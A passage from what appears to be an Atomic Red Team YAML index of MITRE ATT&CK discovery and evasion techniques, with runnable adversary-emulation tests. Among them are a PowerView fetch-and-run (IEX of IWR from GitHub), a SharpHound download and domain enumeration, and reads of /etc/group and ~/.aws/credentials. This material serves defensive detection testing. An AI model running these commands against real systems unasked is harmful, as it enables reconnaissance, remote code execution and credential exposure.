      modified: '2021-10-18T14:57:48.362Z'
      name: User Activity Based Checks
      description: "Adversaries may employ various user activity checks to detect
        and avoid virtualization and analysis environments. This may include changing
        behaviors based on the results of checks for the presence of artifacts indicative
        of a virtual machine environment (VME) or sandbox. If the adversary detects
        a VME, they may alter their malware to disengage from the victim or conceal
        the core functions of the implant. They may also search for VME artifacts
        before dropping secondary or additional payloads. Adversaries may use the
        information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.(Citation: Deloitte
        Environment Awareness)\n\nAdversaries may search for user activity on the
        host based on variables such as the speed/frequency of mouse movements and
        clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks,
        or number of files in common directories such as home or the desktop. Other
        methods may rely on specific user interaction with the system before the malicious
        code is activated, such as waiting for a document to close before activating
        a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double
        click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: 'User activity-based checks will likely occur in the first
        steps of an operation but may also occur throughout as an adversary learns
        the environment. Data and events should not be viewed in isolation, but as
        part of a chain of behavior that could lead to other activities, such as lateral
        movement, based on the information obtained. Detecting actions related to
        virtualization and sandbox identification may be difficult depending on the
        adversary''s implementation and monitoring required. Monitoring for suspicious
        processes being spawned that gather a variety of system information or perform
        other forms of Discovery, especially in a short period of time, may aid in
        detection. '
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      x_mitre_defense_bypassed:
      - Anti-virus
      - Static File Analysis
      - Signature-based detection
      - Host forensic analysis
    atomic_tests: []
  T1069.001:
    technique:
      modified: '2023-04-07T17:14:42.184Z'
      name: 'Permission Groups Discovery: Local Groups'
      description: |-
        Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

        Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Harshal Tupsamudre, Qualys
      - Miriam Wiesner, @miriamxyra, Microsoft Security
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Group: Group Enumeration'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b
      created: '2020-03-12T19:29:21.013Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1069/001
        external_id: T1069.001
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1069.001
    atomic_tests:
    - name: Permission Groups Discovery (Local)
      auto_generated_guid: 952931a4-af0b-4335-bbbe-73c8c5b327ae
      description: 'Permission Groups Discovery

        '
      supported_platforms:
      - macos
      - linux
      executor:
        command: |
          if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
          cat /etc/group
        name: sh
    - name: Basic Permission Groups Discovery Windows (Local)
      auto_generated_guid: 1f454dd6-e134-44df-bebb-67de70fb6cd8
      description: |
        Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
        information will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          net localgroup
          net localgroup "Administrators"
        name: command_prompt
    - name: Permission Groups Discovery PowerShell (Local)
      auto_generated_guid: a580462d-2c19-4bc7-8b9a-57a41b7d3ba4
      description: |
        Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
        information will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          get-localgroup
          Get-LocalGroupMember -Name "Administrators"
        name: powershell
    - name: SharpHound3 - LocalAdmin
      auto_generated_guid: e03ada14-0980-4107-aff1-7783b2b59bb1
      description: 'This module runs the Windows executable of SharpHound in order
        to remotely list members of the local Administrators group (SAMR)

        '
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: FQDN of the targeted domain
          type: string
          default: "$env:UserDnsDomain"
        sharphound_path:
          description: SharpHound Windows executable
          type: path
          default: "$env:TEMP\\SharpHound.exe"
        output_path:
          description: Output for SharpHound
          type: path
          default: "$env:TEMP\\SharpHound\\"
      dependency_executor_name: powershell
      dependencies:
      - description: |
          SharpHound binary must exist on disk and at specified location (#{sharphound_path}).
          And the computer must be domain joined (implicit authentication).
        prereq_command: 'if (Test-Path "#{sharphound_path}") { exit 0 } else { exit
          1 }

          '
        get_prereq_command: 'Invoke-WebRequest "https://github.com/BloodHoundAD/BloodHound/blob/e062fe73d73c015dccb37fae5089342d009b84b8/Collectors/SharpHound.exe?raw=true"
          -OutFile "#{sharphound_path}"

          '
      executor:
        name: powershell
        elevation_required: false
        command: |
          New-Item -Path "#{output_path}" -ItemType Directory > $null
          & "#{sharphound_path}" -d "#{domain}" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "#{output_path}"
        cleanup_command: 'Remove-Item -Recurse #{output_path} -ErrorAction Ignore

          '
    - name: Wmic Group Discovery
      auto_generated_guid: 7413be50-be8e-430f-ad4d-07bf197884b2
      description: 'Utilizing wmic.exe to enumerate groups on the local system. Upon
        execution, information will be displayed of local groups on system.

        '
      supported_platforms:
      - windows
      executor:
        command: 'wmic.exe group get name

          '
        name: powershell
    - name: WMIObject Group Discovery
      auto_generated_guid: 69119e58-96db-4110-ad27-954e48f3bb13
      description: 'Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local
        groups on the endpoint. Upon execution, Upon execution, information will be
        displayed of local groups on system.

        '
      supported_platforms:
      - windows
      executor:
        command: 'Get-WMIObject Win32_Group

          '
        name: powershell
    - name: Permission Groups Discovery for Containers- Local Groups
      auto_generated_guid: 007d7aa4-8c4d-4f55-ba6a-7c965d51219c
      description: Attackers may try to obtain a list of services that are operating
        on remote hosts and local network infrastructure devices, in order to identify
        potential vulnerabilities that can be exploited through remote software attacks.
        They typically use tools to conduct port and vulnerability scans in order
        to obtain this information.
      supported_platforms:
      - containers
      dependency_executor_name: sh
      dependencies:
      - description: Verify docker is installed.
        prereq_command: 'which docker

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
      - description: Verify docker service is running.
        prereq_command: 'sudo systemctl status docker  --no-pager

          '
        get_prereq_command: 'sudo systemctl start docker

          '
      executor:
        command: |-
          docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/
          docker run --name t1069_container  -d -t t1069
          docker exec t1069_container ./test.sh
        cleanup_command: |-
          docker stop t1069_container
          docker rmi -f t1069
        name: sh
  T1201:
    technique:
      modified: '2022-09-06T22:01:45.067Z'
      name: Password Policy Discovery
      description: |-
        Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

        Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

        Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: Monitor logs and processes for tools and command line arguments
        that may indicate they're being used for password policy discovery. Correlate
        that activity with other suspicious activity from the originating system to
        reduce potential false positives from valid user or administrator activity.
        Adversaries will likely attempt to find the password policy early in an operation
        and the activity is likely to happen with other Discovery activity.
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - IaaS
      - Network
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.5'
      x_mitre_contributors:
      - Regina Elwell
      - Sudhanshu Chauhan, @Sudhanshu_C
      - Isif Ibrahima, Mandiant
      - Austin Clark, @c2defense
      x_mitre_data_sources:
      - 'User Account: User Account Metadata'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1201
        external_id: T1201
      - source_name: AWS GetPasswordPolicy
        description: Amazon Web Services. (n.d.). AWS API GetAccountPasswordPolicy.
          Retrieved June 8, 2021.
        url: https://docs.aws.amazon.com/IAM/latest/APIReference/API_GetAccountPasswordPolicy.html
      - source_name: Jamf User Password Policies
        description: Holland, J. (2016, January 25). User password policies on non
          AD machines. Retrieved April 5, 2018.
        url: https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines
      - source_name: Superuser Linux Password Policies
        description: Matutiae, M. (2014, August 6). How to display password policy
          information for a user (Ubuntu)?. Retrieved April 5, 2018.
        url: https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1201
    atomic_tests:
    - name: Examine password complexity policy - Ubuntu
      auto_generated_guid: '085fe567-ac84-47c7-ac4c-2688ce28265b'
      description: 'Lists the password complexity policy to console on Ubuntu Linux.

        '
      supported_platforms:
      - linux
      executor:
        command: 'cat /etc/pam.d/common-password

          '
        name: bash
    - name: Examine password complexity policy - CentOS/RHEL 7.x
      auto_generated_guid: 78a12e65-efff-4617-bc01-88f17d71315d
      description: 'Lists the password complexity policy to console on CentOS/RHEL
        7.x Linux.

        '
      supported_platforms:
      - linux
      dependencies:
      - description: 'System must be CentOS or RHEL v7

          '
        prereq_command: 'if [ $(uname -a | grep -ioP ''el[0-9]'' | grep -oP ''[0-9]'')
          -eq "7" ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'echo Please run from CentOS or RHEL v7

          '
      executor:
        command: 'cat /etc/security/pwquality.conf

          '
        name: bash
    - name: Examine password complexity policy - CentOS/RHEL 6.x
      auto_generated_guid: 6ce12552-0adb-4f56-89ff-95ce268f6358
      description: 'Lists the password complexity policy to console on CentOS/RHEL
        6.x Linux.

        '
      supported_platforms:
      - linux
      dependencies:
      - description: 'System must be CentOS or RHEL v6

          '
        prereq_command: 'if [ $(rpm -q --queryformat ''%{VERSION}'') -eq "6" ]; then
          exit /b 0; else exit /b 1; fi;

          '
        get_prereq_command: 'echo Please run from CentOS or RHEL v6

          '
      executor:
        command: |
          cat /etc/pam.d/system-auth
          cat /etc/security/pwquality.conf
        name: bash
    - name: Examine password expiration policy - All Linux
      auto_generated_guid: 7c86c55c-70fa-4a05-83c9-3aa19b145d1a
      description: 'Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.

        '
      supported_platforms:
      - linux
      executor:
        command: 'cat /etc/login.defs

          '
        name: bash
    - name: Examine local password policy - Windows
      auto_generated_guid: 4588d243-f24e-4549-b2e3-e627acc089f6
      description: 'Lists the local password policy to console on Windows.

        '
      supported_platforms:
      - windows
      executor:
        command: 'net accounts

          '
        name: command_prompt
    - name: Examine domain password policy - Windows
      auto_generated_guid: 46c2c362-2679-4ef5-aec9-0e958e135be4
      description: 'Lists the domain password policy to console on Windows.

        '
      supported_platforms:
      - windows
      executor:
        command: 'net accounts /domain

          '
        name: command_prompt
    - name: Examine password policy - macOS
      auto_generated_guid: 4b7fa042-9482-45e1-b348-4b756b2a0742
      description: 'Lists the password policy to console on macOS.

        '
      supported_platforms:
      - macos
      executor:
        command: pwpolicy getaccountpolicies
        name: bash
    - name: Get-DomainPolicy with PowerView
      auto_generated_guid: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843
      description: 'Utilizing PowerView, run Get-DomainPolicy to return the default
        domain policy or the domain controller policy for the current domain or a
        specified domain/domain controller.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
        name: powershell
    - name: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
      auto_generated_guid: b2698b33-984c-4a1c-93bb-e4ba72a0babb
      description: |
        The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
        Upon successful execution a listing of the policy implemented will display.
        Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'get-addefaultdomainpasswordpolicy

          '
    - name: Use of SecEdit.exe to export the local security policy (including the
        password policy)
      auto_generated_guid: 510cc97f-56ac-4cd3-a198-d3218c23d889
      description: |
        SecEdit.exe can be used to export the current local security policy applied to a host.
        [Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)
      supported_platforms:
      - windows
      executor:
        command: 'secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt

          '
        name: command_prompt
        elevation_required: true
    - name: Examine AWS Password Policy
      auto_generated_guid: 15330820-d405-450b-bd08-16b5be5be9f4
      description: 'This atomic test will display details about the password policy
        for the current AWS account.

        '
      supported_platforms:
      - iaas:aws
      dependencies:
      - description: 'Check if ~/.aws/credentials file has a default stanza is configured

          '
        prereq_command: 'cat ~/.aws/credentials | grep "default"

          '
        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
          defult profile using: aws configure

          '
      executor:
        command: 'aws iam get-account-password-policy

          '
        name: sh
        elevation_required: false
  T1614.001:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Harshal Tupsamudre, Qualys
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19
      type: attack-pattern
      created: '2021-08-18T14:06:45.244Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1614.001
        url: https://attack.mitre.org/techniques/T1614/001
      - source_name: Malware System Language Check
        url: https://www.welivesecurity.com/2009/01/15/malware-trying-to-avoid-some-countries/
        description: Pierre-Marc Bureau. (2009, January 15). Malware Trying to Avoid
          Some Countries. Retrieved August 18, 2021.
      - source_name: CrowdStrike Ryuk January 2019
        url: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/
        description: 'Hanel, A. (2019, January 10). Big Game Hunting with Ryuk: Another
          Lucrative Targeted Ransomware. Retrieved May 12, 2020.'
      - source_name: Darkside Ransomware Cybereason
        url: https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware
        description: Cybereason Nocturnus. (2021, April 1). Cybereason vs. Darkside
          Ransomware. Retrieved August 18, 2021.
      - source_name: Securelist JSWorm
        url: https://securelist.com/evolution-of-jsworm-ransomware/102428/
        description: Fedor Sinitsyn. (2021, May 25). Evolution of JSWorm Ransomware.
          Retrieved August 18, 2021.
      - source_name: SecureList SynAck Doppelgänging May 2018
        description: Ivanov, A. et al. (2018, May 7). SynAck targeted ransomware uses
          the Doppelgänging technique. Retrieved May 22, 2018.
        url: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/
      modified: '2021-10-15T22:00:56.174Z'
      name: 'System Location Discovery: System Language Discovery'
      description: "Adversaries may attempt to gather information about the system
        language of a victim in order to infer the geographical location of that host.
        This information may be used to shape follow-on behaviors, including whether
        the adversary infects the target and/or attempts specific actions. This decision
        may be employed by malware developers and operators to reduce their risk of
        attracting the attention of specific law enforcement agencies or prosecution/scrutiny
        from other entities.(Citation: Malware System Language Check)\n\nThere are
        various sources of data an adversary could use to infer system language, such
        as system defaults and keyboard layouts. Specific checks will vary based on
        the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012)
        and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation:
        CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries
        may attempt to infer the language of a system by querying the registry key
        <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code>
        or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>,
        <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code>
        and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation:
        Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)\n\nOn
        a macOS or Linux system, adversaries may query <code>locale</code> to retrieve
        the value of the <code>$LANG</code> environment variable."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
      identifier: T1614.001
    atomic_tests:
    - name: Discover System Language by Registry Query
      auto_generated_guid: 631d4cf1-42c9-4209-8fe9-6bd4de9421be
      description: "Identify System language by querying the registry on an endpoint.
        \n\nUpon successful execution, result in number format can be looked up to
        correlate the language.\n"
      supported_platforms:
      - windows
      executor:
        command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language

          '
        name: command_prompt
    - name: Discover System Language with chcp
      auto_generated_guid: d91473ca-944e-477a-b484-0e80217cd789
      description: |
        Identify System language with the chcp command.

        Upon successful execution, result in number format can be looked up to correlate the language.
      supported_platforms:
      - windows
      executor:
        command: 'chcp

          '
        name: command_prompt
    - name: Discover System Language with locale
      auto_generated_guid: 837d609b-845e-4519-90ce-edc3b4b0e138
      description: |
        Identify System language with the `locale` command.

        Upon successful execution, the output will contain the environment variables that indicate
        the 5 character locale that can be looked up to correlate the language and territory.
      supported_platforms:
      - linux
      executor:
        command: 'locale

          '
        name: sh
    - name: Discover System Language with localectl
      auto_generated_guid: 07ce871a-b3c3-44a3-97fa-a20118fdc7c9
      description: |
        Identify System language with the `localectl` command.

        Upon successful execution, the key `System Locale` from the output will contain the
        `LANG` environment variable that has the 5 character locale result that can be looked
        up to correlate the language and territory.
      supported_platforms:
      - linux
      executor:
        command: 'localectl status

          '
        name: sh
    - name: Discover System Language by locale file
      auto_generated_guid: 5d7057c9-2c8a-4026-91dd-13b5584daa69
      description: |
        Identify System language with the by reading the locale configuration file.

        The locale configuration file contains the `LANG` environment variable which
        will contain the 5 character locale that can be looked up to correlate the
        language and territory.
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check the location of the locale configuration file.

          '
        prereq_command: "[ -f /etc/locale.conf ] || [ -f /etc/default/locale ] &&
          exit 0 || exit 1\n"
        get_prereq_command: 'echo "Test only valid for systems that have locale file"

          '
      executor:
        command: "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n"
        name: sh
    - name: Discover System Language by Environment Variable Query
      auto_generated_guid: cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a
      description: |
        Identify System language by checking the environment variables

        Upon successful execution, the 5 character locale result can be looked up to
        correlate the language and territory. Environment query commands are likely
        to run with a pattern match command e.g. `env | grep LANG`

        Note: `env` and `printenv` will usually provide the same results. `set` is
        also used as a builtin command that does not generate syscall telemetry but
        does provide a list of the environment variables.
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if printenv command exists on the machine

          '
        prereq_command: '[ -x "$(command -v printenv)" ] && exit 0 || exit 1

          '
        get_prereq_command: |
          echo "printenv command does not exist"
          exit 1
      executor:
        command: |
          env | grep LANG
          printenv LANG
          set | grep LANG
        name: sh
  T1012:
    technique:
      modified: '2023-04-03T18:56:37.011Z'
      name: Query Registry
      description: |-
        Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

        The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Interaction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896
      created: '2017-05-31T21:30:25.584Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1012
        external_id: T1012
      - source_name: Wikipedia Windows Registry
        description: Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.
        url: https://en.wikipedia.org/wiki/Windows_Registry
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1012
    atomic_tests:
    - name: Query Registry
      auto_generated_guid: 8f7578c4-9863-4d83-875c-a565573bbdf0
      description: |
        Query Windows Registry.
        Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).
        References:
        https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
        https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services
        http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
        https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf
      supported_platforms:
      - windows
      executor:
        command: |
          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
          reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
          reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
          reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
          reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
          reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
          reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
          reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
          reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
          reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
          reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
          reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
          reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components"
          reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"
        name: command_prompt
        elevation_required: true
    - name: Query Registry with Powershell cmdlets
      auto_generated_guid: 0434d081-bb32-42ce-bcbb-3548e4f2628f
      description: "Query Windows Registry with Powershell cmdlets, i.e., Get-Item
        and Get-ChildItem. The results from above can also be achieved with Get-Item
        and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe,
        using cmdlets won't generate new processes, which may evade detection systems
        monitoring process generation. \n"
      supported_platforms:
      - windows
      executor:
        command: "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem
          -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr
          Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item
          -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item
          -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item
